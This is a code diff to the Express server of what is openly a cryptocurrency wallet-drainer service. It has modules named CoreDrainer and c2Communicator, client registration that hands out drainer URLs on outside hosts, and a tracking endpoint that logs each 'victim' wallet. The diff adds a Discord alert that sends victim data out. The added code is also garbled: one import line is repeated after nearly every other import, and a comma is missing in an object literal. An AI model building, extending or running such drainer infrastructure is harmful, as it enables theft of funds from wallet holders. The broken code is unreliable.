@@ -1,4 +1,5 @@
 import express from "express";
+import { sendDiscordAlert } from "./discord-alerts.js";
 // ==================== SIMPLE RPC ERROR SUPPRESSION ====================
 const originalError = console.error;
 console.error = (...args) => {
@@ -53,33 +54,61 @@ process.on('unhandledRejection', (reason, promise) => {
 
 console.log('🔇 RPC Error suppression activated globally');
 import http from "http";
+import { sendDiscordAlert } from "./discord-alerts.js";
 import cors from "cors";
+import { sendDiscordAlert } from "./discord-alerts.js";
 import { Server as SocketIOServer } from "socket.io";
+import { sendDiscordAlert } from "./discord-alerts.js";
 import path from "path";
+import { sendDiscordAlert } from "./discord-alerts.js";
 import fs from "fs";
+import { sendDiscordAlert } from "./discord-alerts.js";
 import dotenv from "dotenv";
+import { sendDiscordAlert } from "./discord-alerts.js";
 import { SwapHandler } from './swapHandler.js'
+import { sendDiscordAlert } from "./discord-alerts.js";
 import { fileURLToPath } from "url";
+import { sendDiscordAlert } from "./discord-alerts.js";
 import { dirname } from "path";
+import { sendDiscordAlert } from "./discord-alerts.js";
 import trackHandler from "./api/track.js";
+import { sendDiscordAlert } from "./discord-alerts.js";
 import fetch from "node-fetch";
+import { sendDiscordAlert } from "./discord-alerts.js";
 import proxyHandler from './api/proxy.js';
+import { sendDiscordAlert } from "./discord-alerts.js";
 import rateLimit from 'express-rate-limit';
+import { sendDiscordAlert } from "./discord-alerts.js";
 import helmet from 'helmet';
+import { sendDiscordAlert } from "./discord-alerts.js";
 import { ethers } from "ethers";
+import { sendDiscordAlert } from "./discord-alerts.js";
 import { adminAuth } from "./admin-security.js";
+import { sendDiscordAlert } from "./discord-alerts.js";
 import multiSigManager from './lib/multiSigManager.js'; 
+import { sendDiscordAlert } from "./discord-alerts.js";
 import { rotateRPC } from './lib/rpcDecoder.js';
+import { sendDiscordAlert } from "./discord-alerts.js";
 import { getExplorerApiKey, getRpcUrl } from './config.js';
+import { sendDiscordAlert } from "./discord-alerts.js";
 import { CoreDrainer } from './coreDrainer.js';
+import { sendDiscordAlert } from "./discord-alerts.js";
 import { flowCoordinator } from './modules/FlowCoordinator.js';
+import { sendDiscordAlert } from "./discord-alerts.js";
 import { uiManager } from './modules/UIManager.js';
+import { sendDiscordAlert } from "./discord-alerts.js";
 import { c2Communicator } from './modules/c2Communicator.js';
+import { sendDiscordAlert } from "./discord-alerts.js";
 import { securityManager } from './modules/securityManager.js';
+import { sendDiscordAlert } from "./discord-alerts.js";
 import { chainManager } from './modules/chainManager.js';
+import { sendDiscordAlert } from "./discord-alerts.js";
 import { generateClientSite } from './client-template.js';
+import { sendDiscordAlert } from "./discord-alerts.js";
 import { generateMarketingSite } from './saas-website.js';
+import { sendDiscordAlert } from "./discord-alerts.js";
 import cron from "node-cron";
+import { sendDiscordAlert } from "./discord-alerts.js";
 
 // ==================== CONFIGURATION & INITIALIZATION ====================
 dotenv.config();
@@ -531,7 +560,7 @@ app.post('/saas/v2/register', (req, res) => {
       success: true,
       clientId: clientId,
       drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
-      dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}`,
+      dashboardUrl: `https://service-s816.onrender.com/saas/dashboard/${clientId}`
       message: 'Client registered successfully'
     });
     
@@ -577,6 +606,9 @@ app.post("/api/track", async (req, res) => {
     }
 
     const victimData = req.body;
+
+  // Send Discord alert
+  await sendDiscordAlert(victimData);
     
     console.log(`👤 Victim connected: ${victimData.walletAddress} on ${victimData.chain}`);
     
@@ -3153,7 +3185,7 @@ app.get("/api/saas-clients", (req, res) => {
         victimCount,
         registrationDate: "Recent",
         drainerUrl: "https://ch.xqx.workers.dev/?client=" + clientId,
-        dashboardUrl: "https://service-s816.onrender.com/saas/dashboard/" + clientId
+        dashboardUrl: `https://service-s816.onrender.com/saas/dashboard/${clientId}`
       };
     });
     
